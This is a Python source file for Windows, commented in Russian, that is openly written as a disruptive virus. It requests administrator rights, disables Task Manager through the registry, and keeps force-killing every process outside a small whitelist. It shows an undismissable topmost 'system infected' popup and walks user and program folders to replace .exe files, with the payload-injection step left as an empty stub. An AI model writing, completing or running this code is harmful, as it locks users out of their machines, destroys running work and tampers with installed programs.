import os
import sys
import shutil
import subprocess
import ctypes
import win32api
import win32con
import win32gui
import win32process
import threading
import time
from ctypes import wintypes

# ==================== ФУНКЦИИ ОБХОДА ЗАЩИТЫ ====================

def disable_task_manager():
    """Отключает диспетчер задач через реестр"""
    try:
        key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                  "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                  0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(key, "DisableTaskMgr", 0, win32con.REG_DWORD, 1)
        win32api.RegCloseKey(key)
    except:
        pass

def elevate_privileges():
    """Получает привилегии администратора"""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit(0)
    except:
        pass

def kill_non_critical_processes():
    """Завершает все некритичные процессы"""
    critical_processes = {'system', 'system idle process', 'smss.exe', 'csrss.exe', 
                         'wininit.exe', 'services.exe', 'lsass.exe', 'svchost.exe'}
    
    try:
        processes = subprocess.check_output('tasklist /fo csv /nh', shell=True).decode('cp866')
        for line in processes.split('\n'):
            if '.exe' in line.lower():
                proc_name = line.split('","')[0].replace('"', '').lower()
                if proc_name not in critical_processes:
                    try:
                        subprocess.call(f'taskkill /f /im {proc_name}', shell=True)
                    except:
                        pass
    except:
        pass

# ==================== НЕЗАКРЫВАЕМОЕ ОКНО ====================

def create_undismissable_popup():
    """Создает попап, который невозможно закрыть"""
    def window_procedure(hwnd, msg, wparam, lparam):
        if msg == win32con.WM_CLOSE:
            return 0  # Игнорируем сообщение о закрытии
        return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)
    
    class_name = "UndismissableWindow"
    wc = win32gui.WNDCLASS()
    wc.lpfnWndProc = window_procedure
    wc.lpszClassName = class_name
    wc.hInstance = win32api.GetModuleHandle(None)
    atom = win32gui.RegisterClass(wc)
    
    hwnd = win32gui.CreateWindowEx(
        win32con.WS_EX_TOPMOST | win32con.WS_EX_TOOLWINDOW,
        atom,
        "ВНИМАНИЕ: Система заражена",
        win32con.WS_POPUP | win32con.WS_VISIBLE,
        100, 100, 800, 600,
        None, None, wc.hInstance, None
    )
    
    # Делаем окно поверх всех остальных
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                         win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
    
    # Скрываем кнопки закрытия и свернения
    style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
    style &= ~(win32con.WS_SYSMENU | win32con.WS_MINIMIZEBOX)
    win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)
    
    return hwnd

# ==================== ИНФЕКЦИЯ EXE ФАЙЛОВ ====================

def infect_exe_files():
    """Заражает EXE файлы, добавляя нагрузку без повреждения оригинала"""
    target_dirs = ['C:\\Users', 'C:\\Program Files', 'C:\\Windows\\Temp']
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
            
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.exe') and not file.startswith('python'):
                    exe_path = os.path.join(root, file)
                    
                    try:
                        # Создаем зараженную копию
                        infected_name = f"{file}_infected.exe"
                        infected_path = os.path.join(root, infected_name)
                        
                        # Копируем оригинальный EXE
                        shutil.copy2(exe_path, infected_path)
                        
                        # Добавляем наш код в ресурсы EXE
                        add_payload_to_exe(infected_path)
                        
                        # Подменяем оригинальный файл
                        os.remove(exe_path)
                        os.rename(infected_path, exe_path)
                        
                    except Exception as e:
                        continue

def add_payload_to_exe(exe_path):
    """Добавляет полезную нагрузку в EXE файл"""
    # Здесь будет код для инъекции в ресурсы EXE
    # В реальности это делается через PE-парсеры и инжекторы
    pass

# ==================== ОСНОВНАЯ ЛОГИКА ====================

def main():
    # Повышаем привилегии
    elevate_privileges()
    
    # Отключаем диспетчер задач
    disable_task_manager()
    
    # Завершаем некритичные процессы
    kill_non_critical_processes()
    
    # Создаем неубиваемое окно в отдельном потоке
    popup_thread = threading.Thread(target=create_undismissable_popup)
    popup_thread.daemon = True
    popup_thread.start()
    
    # Заражаем EXE файлы
    infect_exe_files()
    
    # Бесконечный цикл для поддержания активности
    while True:
        time.sleep(1)
        # Поддерживаем наши процессы активными
        kill_non_critical_processes()

if __name__ == "__main__":
    main()